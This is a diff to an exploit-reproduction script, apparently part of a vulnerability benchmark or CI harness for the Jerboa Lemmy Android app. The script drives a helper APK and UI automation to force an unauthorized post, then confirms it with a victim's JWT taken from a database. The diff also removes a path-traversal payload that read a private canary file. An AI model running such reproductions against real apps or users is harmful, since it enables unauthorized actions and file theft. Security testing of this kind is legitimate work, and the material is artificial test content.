@@ -9,7 +9,7 @@ LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
 log() { printf '[vuln0] %s\n' "$*"; }
 
 log "Starting vuln_scenario_0 for Jerboa"
-log "Driving helper APK through traversal and send-intent side effects"
+log "Driving helper APK; require confirmed unauthorized post side effect"
 
 set +e
 PYTHONPATH="$ROOT_DIR" python3 - "$LOG_FILE" <<'PY'
@@ -21,34 +21,12 @@ from pathlib import Path
 
 from jerboa_probe_utils import (
     get_victim_jwt_from_db,
-    get_dynamic_canary,
-    jerboa_canary_private_path,
     run_root_shell,
     run_helper_reproduction,
-    run_traversal_reproduction,
 )
 
 log_path = Path(sys.argv[1])
 lines: list[str] = []
-
-expected_secret = get_dynamic_canary()
-if not expected_secret:
-    raise SystemExit("missing dynamic canary")
-
-target = jerboa_canary_private_path()
-target_uri = f"shared_files/../../../../{target.lstrip('/')}"
-traversal_ok, traversal_content = run_traversal_reproduction(
-    target_uri,
-    run_id=uuid.uuid4().hex,
-)
-lines.append(
-    "mode=traversal "
-    f"transport_ok={str(traversal_ok).lower()} "
-    f"read_preview={traversal_content[:200]}"
-)
-if traversal_ok and expected_secret not in traversal_content:
-    lines.append("mode=traversal verdict=false reason=canary_not_found")
-    traversal_ok = False
 
 dispatch_body = f"mcb-post-{uuid.uuid4().hex}"
 dispatch_ok, _ = run_helper_reproduction(
@@ -86,17 +64,42 @@ else:
 
         import requests
 
-        base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
+        base_url = os.getenv("LEMMY_URL", "https://127.0.0.1:8536")
+        ca_bundle = os.getenv("REQUESTS_CA_BUNDLE") or str(
+            (Path(__file__).resolve().parents[3] / "tls" / "rootCA.pem")
+        )
+        verify = ca_bundle if Path(ca_bundle).exists() else False
+        # Drive UI to actually submit the post (ACTION_SEND alone only prefills).
+        # Use uiautomator2; fail closed if automation cannot complete.
+        ui = Path(__file__).resolve().parent / "create_post_automation.py"
+        # In CI, __file__ may not resolve under stdin; compute from log path location.
+        ui = log_path.parent / "create_post_automation.py"
+        if not ui.exists():
+            raise RuntimeError(f"missing UI automation helper: {ui}")
+        import subprocess
+
+        ui_run = subprocess.run(
+            [sys.executable, str(ui), dispatch_body],
+            capture_output=True,
+            text=True,
+            timeout=180,
+        )
+        lines.append(f"mode=dispatch_send ui_submit_exit={ui_run.returncode}")
+        if ui_run.returncode != 0:
+            lines.append("mode=dispatch_send verdict=false reason=ui_submit_failed")
+            lines.append(f"mode=dispatch_send ui_submit_stderr={ui_run.stderr.strip()[:400]}")
+            raise RuntimeError("ui submit failed")
+
         # Lemmy is typically served with a self-signed cert in CI.
         # Bound retries to reduce flakes from eventual consistency / noisy feeds.
-        deadline = time.time() + 60
+        deadline = time.time() + 90
         while time.time() < deadline and not post_ok:
             response = requests.get(
                 f"{base_url}/api/v3/post/list",
                 params={"type_": "All", "limit": 200},
                 headers={"Authorization": f"Bearer {victim_jwt}"},
                 timeout=(5, 15),
-                verify=False,
+                verify=verify,
             )
             if response.status_code == 200:
                 posts = response.json().get("posts", [])
